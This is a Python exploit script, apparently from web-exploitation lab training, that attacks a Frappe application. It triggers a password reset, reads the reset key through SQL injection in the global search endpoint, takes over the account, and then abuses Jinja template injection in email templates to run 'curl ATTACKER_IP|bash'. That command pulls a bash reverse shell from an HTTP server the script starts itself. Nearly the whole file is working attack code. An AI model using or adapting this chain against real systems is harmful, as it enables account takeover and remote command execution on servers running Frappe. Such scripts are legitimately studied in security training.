import httpx
import base64
import random
import json
import sys
import re
import concurrent.futures
from http.server import HTTPServer, SimpleHTTPRequestHandler

proxy = {
        "http://": "http://localhost:8080",
        "https://": "http://localhost:8080",
}

client = httpx.Client(
        verify=False,
        timeout=10.0,
        proxies=proxy,
)

# Config
TARGET_IP = "192.168.151.123"
TARGET_PORT = "8000"
ATTACKER_IP = "192.168.45.209"
REVSHELL_PORT = "4444"
HTTPSERVER_PORT = "80"
URL = f"http://{TARGET_IP}:{TARGET_PORT}/"
USERNAME = "zeljka"
EMAIL = "zeljka.k@randomdomain.com"

def issue_password_reset_key():
    data = {"cmd":"frappe.core.doctype.user.user.reset_password","user":EMAIL}
    res = client.post(f"{URL}", data=data)
    assert "Password reset instructions have been sent to your email" in res.json()["_server_messages"], "[x] Failed to issue password reset key."
    print("[+] Password reset key issued successfully.")

def extract_password_reset_key():
    exploit = f"\" UNION ALL SELECT 1,reset_password_key COLLATE utf8mb4_general_ci,3,4,5 from tabUser WHERE username='{USERNAME}'-- "
    payload = {"cmd":"frappe.utils.global_search.web_search","text":"awae_text","scope":f"awae_scope{exploit}"}

    res = client.post(f"{URL}", data=payload)
    assert res.status_code == 200, "[x] Failed to extract password reset key."

    key = res.json()["message"][0]["name"]
    print(f"[+] Password reset key found. {key}")
    return key

def password_reset(key):
    data = {
            "key":key,
            "old_password":"",
            "new_password":"Awae1234",
            "logout_all_sessions":"1",
            "cmd":"frappe.core.doctype.user.user.update_password"
    }
    
    res = client.post(f"{URL}", data=data)
    assert res.json()["message"] == "/desk", "[x] Failed to reset password."
    print(f"[+] Password reset successfull.")
    return key

def save_ssti_mail_template(payload):
    path = "api/method/frappe.desk.form.save.savedocs"
    
    subject = f"AWAE-{random.randrange(1000000)}"
    data = f'{{"docstatus":0,"doctype":"Email Template","name":"New Email Template 2","__islocal":1,"__unsaved":1,"owner":"{EMAIL}","__newname":"{subject}","subject":"{subject}","response":"<div>{payload}</div>"}}'
    
    res = client.post(f"{URL}{path}", data={"doc": data, "action": "Save"})
    
    assert res.status_code == 200, f"[x] Failed to save mail template.\npayload:{payload}"
    print(f"[+] Save mail template successfull.")
    return subject

def trigger_ssti(subject):
    path = "api/method/frappe.email.doctype.email_template.email_template.get_email_template"
    data={"template_name":subject, "doc":"{}", "_lang":""}
    
    res = client.post(f"{URL}{path}", data=data)
    assert res.status_code == 200, f"[x] SSTI failed. {re.findall(r'<pre>.*</pre>', res.text)[0]}"
    return res.json()["message"]["message"]

def find_popen_index(string):
    classes = re.split(r">, <|>, |, <", string)
    try:
        index = classes.index("class 'subprocess.Popen'")
        print(f"[+] Popen found. index:{index}")
        return index
    except ValueError:
        print("[x] Popen not found.")
        sys.exit(1)

class CustomHTTPHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"#!/bin/bash\n/bin/bash -i >& /dev/tcp/{ATTACKER_IP.encode()}/{REVSHELL_PORT.encode()} 0>&1");

def run_background_http_server():
    server = HTTPServer((ATTACKER_IP, int(HTTPSERVER_PORT)), CustomHTTPHandler)
    executor = concurrent.futures.ThreadPoolExecutor()
    executor.submit(server.serve_forever)
    executor.shutdown(wait=False)

if __name__ == "__main__":
    run_background_http_server()

    issue_password_reset_key()
    password_reset_key = extract_password_reset_key()
    password_reset(password_reset_key)

    payload1 = "{{()['__class__']['__mro__'][1]['__subclasses__']()}}"
    subject = save_ssti_mail_template(payload1)
    res = trigger_ssti(subject)
    popen_index = find_popen_index(res)

    payload2 = f"{{{{()['__class__']['__mro__'][1]['__subclasses__']()[{popen_index}]('curl {ATTACKER_IP}:{HTTPSERVER_PORT}|bash', shell=True)}}}}"
    subject = save_ssti_mail_template(payload2)
    res = trigger_ssti(subject)

    assert "subprocess.Popen object at" in res, "[x] Failed to execute reverse shell."
    print("[+] Check the terminal waiting for reversh shell.")
